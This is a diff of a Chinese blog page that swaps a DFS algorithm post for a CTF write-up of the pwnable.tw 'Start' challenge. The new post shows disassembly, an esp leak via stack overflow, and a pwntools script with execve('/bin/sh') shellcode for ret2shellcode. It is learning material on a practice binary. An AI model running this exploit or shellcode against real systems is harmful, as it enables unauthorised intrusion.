@@ -23,20 +23,22 @@
     var CONFIG = {"hostname":"ikoct.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="算法概述DFS用于找到图中从给定起点到终点所有无交点路线(我猜的) 并不保证全部路线都能找到 也不保证找到的路线是最短的  因为CTF遇到过好几次 所以学习一下">
+  <meta name="description" content="记录一下Pwn入门刷题记录">
 <meta property="og:type" content="article">
-<meta property="og:title" content="1!秒钟寄!一个算法:DFS-深度优先搜索">
-<meta property="og:url" content="https://ikoct.com/2024/03/16/1-%E7%A7%92%E9%92%9F%E5%AF%84-%E4%B8%80%E4%B8%AA%E7%AE%97%E6%B3%95-DFS-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/">
+<meta property="og:title" content="Pwnable.tw刷题记录">
+<meta property="og:url" content="https://ikoct.com/2024/05/22/Pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
 <meta property="og:site_name" content="Ikoct的饮冰室">
-<meta property="og:description" content="算法概述DFS用于找到图中从给定起点到终点所有无交点路线(我猜的) 并不保证全部路线都能找到 也不保证找到的路线是最短的  因为CTF遇到过好几次 所以学习一下">
+<meta property="og:description" content="记录一下Pwn入门刷题记录">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-03-16T03:32:29.000Z">
-<meta property="article:modified_time" content="2024-03-30T03:30:16.138Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/22/20240522-194541.png">
+<meta property="article:published_time" content="2024-05-22T12:44:16.000Z">
+<meta property="article:modified_time" content="2024-05-22T12:48:16.190Z">
 <meta property="article:author" content="1K0CT B14s">
-<meta property="article:tag" content="算法">
+<meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/22/20240522-194541.png">
 
-<link rel="canonical" href="https://ikoct.com/2024/03/16/1-%E7%A7%92%E9%92%9F%E5%AF%84-%E4%B8%80%E4%B8%AA%E7%AE%97%E6%B3%95-DFS-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/">
+<link rel="canonical" href="https://ikoct.com/2024/05/22/Pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
 
 
 <script id="page-configurations">
@@ -49,7 +51,7 @@
   };
 </script>
 
-  <title>1!秒钟寄!一个算法:DFS-深度优先搜索 | Ikoct的饮冰室</title>
+  <title>Pwnable.tw刷题记录 | Ikoct的饮冰室</title>
   
 
 
@@ -192,7 +194,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ikoct.com/2024/03/16/1-%E7%A7%92%E9%92%9F%E5%AF%84-%E4%B8%80%E4%B8%AA%E7%AE%97%E6%B3%95-DFS-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/">
+    <link itemprop="mainEntityOfPage" href="https://ikoct.com/2024/05/22/Pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -205,7 +207,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          1!秒钟寄!一个算法:DFS-深度优先搜索
+          Pwnable.tw刷题记录
         </h1>
 
         <div class="post-meta">
@@ -214,27 +216,21 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2024-03-16 11:32:29" itemprop="dateCreated datePublished" datetime="2024-03-16T11:32:29+08:00">2024-03-16</time>
+              <time title="创建时间：2024-05-22 20:44:16 / 修改时间：20:48:16" itemprop="dateCreated datePublished" datetime="2024-05-22T20:44:16+08:00">2024-05-22</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-30 11:30:16" itemprop="dateModified" datetime="2024-03-30T11:30:16+08:00">2024-03-30</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AE%97%E6%B3%95/%E5%9B%BE%E8%AE%BA/" itemprop="url" rel="index"><span itemprop="name">图论</span></a>
+                  <a href="/categories/CTF/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                 </span>
             </span>
 
@@ -244,14 +240,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>370</span>
+              <span>2.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -263,11 +259,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h3><p>DFS用于找到图中从给定起点到终点所有无交点路线(我猜的) 并不保证全部路线都能找到 也不保证找到的路线是最短的</p>
-<p> 因为CTF遇到过好几次 所以学习一下</p>
+        <p>记录一下Pwn入门刷题记录</p>
 <span id="more"></span>
 
-<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dfs_iterative_paths</span>(<span class="params">graph, start, end = start</span>):</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    stack = [(start, [start])]</span><br><span class="line"></span><br><span class="line">    paths = []</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        node, path = stack.pop()</span><br><span class="line">        visited.add(node)</span><br><span class="line">        <span class="keyword">if</span> node == end:</span><br><span class="line">            paths.append(path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> graph[node]:</span><br><span class="line">            <span class="keyword">if</span> neighbor <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                stack.append((neighbor, path + [neighbor]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> paths</span><br></pre></td></tr></table></figure>
+<h2 id="Start-stackoverflow-ret2shellcode"><a href="#Start-stackoverflow-ret2shellcode" class="headerlink" title="Start | stackoverflow | ret2shellcode"></a>Start | stackoverflow | ret2shellcode</h2><p>题目给的二进制文件很简单 直接用系统调用来输出提示和输入 然后<code>_exit</code>退出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060 54                            push    esp</span><br><span class="line">.text:08048061 68 9D 80 04 08                push    offset _exit</span><br><span class="line">.text:08048066 31 C0                         xor     eax, eax</span><br><span class="line">.text:08048068 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:0804806A 31 C9                         xor     ecx, ecx</span><br><span class="line">.text:0804806C 31 D2                         xor     edx, edx</span><br><span class="line">.text:0804806E 68 43 54 46 3A                push    3A465443h</span><br><span class="line">.text:08048073 68 74 68 65 20                push    20656874h</span><br><span class="line">.text:08048078 68 61 72 74 20                push    20747261h</span><br><span class="line">.text:0804807D 68 73 20 73 74                push    74732073h</span><br><span class="line">.text:08048082 68 4C 65 74 27                push    2774654Ch</span><br><span class="line">.text:08048087 89 E1                         mov     ecx, esp                        ; addr</span><br><span class="line">.text:08048089 B2 14                         mov     dl, 14h                         ; len</span><br><span class="line">.text:0804808B B3 01                         mov     bl, 1                           ; fd</span><br><span class="line">.text:0804808D B0 04                         mov     al, 4</span><br><span class="line">.text:0804808F CD 80                         int     80h                             ; LINUX - sys_write</span><br><span class="line">.text:0804808F</span><br><span class="line">.text:08048091 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:08048093 B2 3C                         mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095 B0 03                         mov     al, 3</span><br><span class="line">.text:08048097 CD 80                         int     80h                             ; LINUX -</span><br><span class="line">.text:08048097</span><br><span class="line">.text:08048099 83 C4 14                      add     esp, 14h</span><br><span class="line">.text:0804809C C3                            retn</span><br><span class="line">.text:0804809C</span><br><span class="line">.text:0804809C                               _start endp ; sp-analysis failed</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; Attributes: noreturn</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; void exit(int status)</span><br><span class="line">.text:0804809D                               _exit proc near                         ; DATA XREF: _start+1↑o</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               status= dword ptr  4</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D 5C                            pop     esp</span><br><span class="line">.text:0804809E 31 C0                         xor     eax, eax</span><br><span class="line">.text:080480A0 40                            inc     eax</span><br><span class="line">.text:080480A1 CD 80                         int     80h</span><br></pre></td></tr></table></figure>
+
+<p><code>checksec</code>可以看到保护全关 <code>vmmap</code>发现栈可写可执行 用gdb调试一下可以发现有栈溢出<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/22/20240522-194541.png" alt="image-20240522194534063"></p>
+<p>并且返回地址距离输入缓冲区起点20bytes 对应<code>ret</code>前的<code>add esp, 0x14</code> 但是一次输入即使修改返回地址也没有现成的漏洞可以利用 所以利用栈可执行来看看能不能ret2shellcode 思路是<code>ret</code>指令执行后esp指向自己当前的地址 这时候再进行系统调用就会泄露esp内容 所以第一个payload可以这样写:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;zsh&#x27;</span>]</span><br><span class="line">sh = process([<span class="string">&quot;./start&quot;</span>])</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">ret = <span class="number">0x8048087</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(ret)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">esp = u32(sh.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
+
+<p>至于send和sendline的区别借用一下这位师傅的<a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/9fda4edb.html?highlight=pwntools">讲解</a> 总之<code>sys-read</code>会将<code>\n</code>读到栈上 所以用send</p>
+<p>下一步就是返回到shellcode上 从<code>add esp, 0x14</code> 可以知道返回地址还是距离缓冲区起点20bytes 这意味着shellcode长度需要在20bytes以内 可以在<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/index.html">这个网站</a>找合适的shellcode或者等以后我能力够了自己写( 所以第二个payload可以这样写:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(esp + <span class="number">20</span>) + shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后拿到flag</p>
 
     </div>
 
@@ -277,7 +283,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E7%AE%97%E6%B3%95/" rel="tag"># 算法</a>
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
           </div>
 
         
@@ -286,12 +292,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2024/03/16/ELF%E6%96%87%E4%BB%B6%E5%A4%B4/" rel="prev" title="ELF文件头">
-      <i class="fa fa-chevron-left"></i> ELF文件头
+    <a href="/2024/05/10/Frida%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="prev" title="Frida学习记录">
+      <i class="fa fa-chevron-left"></i> Frida学习记录
     </a></div>
       <div class="post-nav-item">
-    <a href="/2024/03/26/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/" rel="next" title="反调试技术">
-      反调试技术 <i class="fa fa-chevron-right"></i>
+    <a href="/2024/05/22/Pwn%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/" rel="next" title="Pwn入门记录">
+      Pwn入门记录 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -351,7 +357,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%97%E6%B3%95%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">算法概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">算法实现</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Start-stackoverflow-ret2shellcode"><span class="nav-number">1.</span> <span class="nav-text">Start | stackoverflow | ret2shellcode</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
